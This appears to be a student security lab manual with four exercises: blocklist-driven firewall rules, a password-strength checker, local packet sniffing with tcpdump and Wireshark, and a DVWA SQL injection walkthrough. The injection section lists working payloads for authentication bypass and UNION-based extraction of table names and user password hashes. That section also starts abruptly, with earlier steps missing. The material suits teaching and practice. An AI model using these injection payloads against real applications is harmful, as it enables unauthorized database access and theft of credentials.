BASIC FIREWALL CONFIGURATION
============================================================

1. Software Requirements:
   - Python 3.x
   - Windows Operating System
   - PowerShell
   - Internet Connection
   - Visual Studio Code / Any Python IDE

2. Manual Firewall Configuration:
   - Open "Windows Defender Firewall with Advanced Security".
   - Click on "Inbound Rules".
   - Click "New Rule" from the right panel.
   - Select "Custom" → Click Next.
   - Select "All Programs" → Click Next.
   - Keep default Protocol and Ports settings → Click Next.

3. Configure IP Blocking:
   - Under Scope:
     - Select "These IP addresses" under Remote IP address.
     - Click "Add".
     - Enter IP address to block (example: 1.2.3.4).
     - Click OK → Next.

4. Configure Action:
   - Select "Block the connection".
   - Click Next.

5. Configure Profile:
   - Select:
     - Domain
     - Private
     - Public
   - Click Next.

6. Create Firewall Rule:
   - Enter rule name (example: Manual_Block_IP).
   - Click Finish.
   - Incoming traffic from the specified IP will now be blocked.

7. Create Python Program:
   - Create a file named firewall.py.

   Add the following code:

   import requests, csv, subprocess

   # source: Abuse CH
   response = requests.get(
   "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
   ).text

   rule = 'netsh advfirewall firewall delete rule name="BadIP"'
   subprocess.run(["PowerShell", "-Command", rule])

   mycsv = csv.reader(
   filter(lambda x: not x.startswith("#"), response.splitlines())
   )

   for row in mycsv:
       ip = row[1]

       if ip != "dst_ip":
           print("Added Rule to block:", ip)

           rule = "netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP=" + ip

           subprocess.run(["PowerShell", "-Command", rule])

8. Open Command Prompt as Administrator:
   - Search for Command Prompt.
   - Right click → Run as Administrator.

9. Navigate to Program Directory:
   - Use cd command to move to folder containing firewall.py.

   Example:

   cd C:\Users\YourName\Desktop

10. Verify Python Installation:
    - Run:

    python --version

11. Install Required Library:
    - Install requests module:

    python -m pip install requests

12. Execute the Program:
    - Run:

    python firewall.py

13. Sample Output:

    Added Rule to block: 45.9.148.221
    Added Rule to block: 103.17.48.5
    Added Rule to block: 185.234.219.12

14. Verify Firewall Rules:
    - Open Windows Defender Firewall with Advanced Security.
    - Go to Outbound Rules.
    - Search for rule name: BadIP.
    - Multiple blocked IP entries will be visible.

15. Result:
    - Malicious IP addresses are automatically downloaded.
    - Firewall rules are created dynamically.
    - Incoming/Outgoing connections from malicious IPs are blocked.

PASSWORD STRENGTH TESTING USING PYTHON

import re

def check_password_strength(password):

   if len(password) < 8:
       return "Weak: Password must be at least 8 characters long."

   if not any(char.isdigit() for char in password):
       return "Weak: Password must include at least one number."

   if not any(char.isupper() for char in password):
       return "Weak: Password must include at least one uppercase letter."

   if not any(char.islower() for char in password):
       return "Weak: Password must include at least one lowercase letter."

   if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
       return "Medium: Add special characters to make your password stronger."

   return "Strong: Your password is secure!"

def password_checker():

   print("Welcome to the Password Strength Checker!")

   while True:

       password = input("\nEnter your password (or type 'exit' to quit): ")

       if password.lower() == "exit":
           print("Thank you for using the Password Strength Checker! Goodbye!")
           break

       result = check_password_strength(password)
       print(result)

if __name__ == "__main__":
   password_checker()

PACKET SNIFFING AND NETWORK TRAFFIC ANALYSIS
============================================================

1. Aim:
   - To capture live network packets.
   - To analyze network traffic using tcpdump and Wireshark.
   - To understand how sensitive information is exposed in HTTP communication.

2. Requirements:
   - Kali Linux (Oracle VirtualBox)
   - Wireshark
   - Python 3
   - Firefox Browser

3. Open Kali Linux:
   - Start the Kali Linux virtual machine.

4. Open Terminal:
   - Open terminal in Kali Linux.

5. Start Local HTTP Server:
   - Run the following command:

   python3 -m http.server 8080

   - This starts a local HTTP server on port 8080.

6. Start Packet Capture:
   - Open a new terminal.
   - Run:

   sudo tcpdump -i any -w capture.pcap port 8080

   - tcpdump starts capturing packets on port 8080.
   - Captured packets are stored in capture.pcap.

7. Generate Network Traffic:
   - Open Firefox browser in Kali Linux.
   - Visit:

   http://localhost:8080

   - Refresh the page multiple times to generate HTTP traffic.

8. Stop Packet Capture:
   - Return to tcpdump terminal.
   - Press:

   Ctrl + C

   - Packet capturing stops.
   - Total captured packets are displayed.

9. Locate Packet Capture File:
   - Click Kali Linux dragon icon.
   - Open File Manager.
   - Open Home directory.
   - Locate:

   capture.pcap

10. Open Capture File in Wireshark:
    - Double click capture.pcap.
    - File opens automatically in Wireshark.

11. Filter Important HTTP Packets:
    - In Wireshark filter bar, enter:

    http.request.method == "POST"

    - Press Enter.
    - Only POST request packets are displayed.

12. Analyze Packet Details:
    - Select any captured packet.
    - Observe the following information:
      - Browser details
      - Operating System
      - Browser version
      - Language information
      - Visited URLs

13. Observe Sensitive Data Exposure:
    - If forms are submitted:
      - Username can be seen.
      - Password can be seen.
    - Data is visible in plain text because HTTP is not encrypted.

14. Conclusion:
    - Network packets were successfully captured and analyzed.
    - Sensitive information is visible in HTTP traffic.
    - Packet sniffing demonstrates that HTTP communication is insecure.
    - HTTPS encryption is necessary to protect sensitive data.

   - Click:

   - Navigate to DVWA Security.

   - Click Submit.

8. Open SQL Injection Module:
   - Navigate:
     DVWA → Vulnerabilities → SQL Injection

   - An input box requesting User ID will appear.

9. Perform Normal Input Test:
   - Enter:

   1

   - User details are displayed normally.

10. Perform Authentication Bypass:
    - Enter:

    1' OR '1'='1

    - Result:
      All user records are displayed.

    - Confirms SQL Injection vulnerability.

11. Find Number of Columns:
    - Execute:

    1' ORDER BY 1-- -
    1' ORDER BY 2-- -
    1' ORDER BY 3-- -

    - Continue until error occurs.
    - Last successful query indicates total columns.

12. Perform UNION-Based Injection:
    - Execute:

    1' UNION SELECT 1,2-- -

13. Extract Database Name:
    - Execute:

    1' UNION SELECT database(),2-- -

14. Extract Table Names:
    - Execute:

    1' UNION SELECT table_name,2
    FROM information_schema.tables
    WHERE table_schema=database()-- -

15. Extract Column Names:
    - Execute:

    1' UNION SELECT column_name,2
    FROM information_schema.columns
    WHERE table_name='users'-- -

16. Extract Username and Password:
    - Execute:

    1' UNION SELECT user,password FROM users-- -

    - Passwords may appear as hashes.

17. Result:
    - SQL Injection attack was successfully performed.
    - Authentication bypass was achieved.
    - Database information was extracted.
    - Improper input validation vulnerability was identified.

18. Conclusion:
    - Unsanitized user input causes SQL Injection vulnerabilities.
    - Attackers can gain unauthorized database access.
    - Proper security measures are necessary to secure applications.

19. Prevention Techniques:
    - Prepared Statements
    - Parameterized Queries
    - Input Validation
    - Input Sanitization
    - Stored Procedures
    - Web Application Firewall (WAF)
    - Least Privilege Access
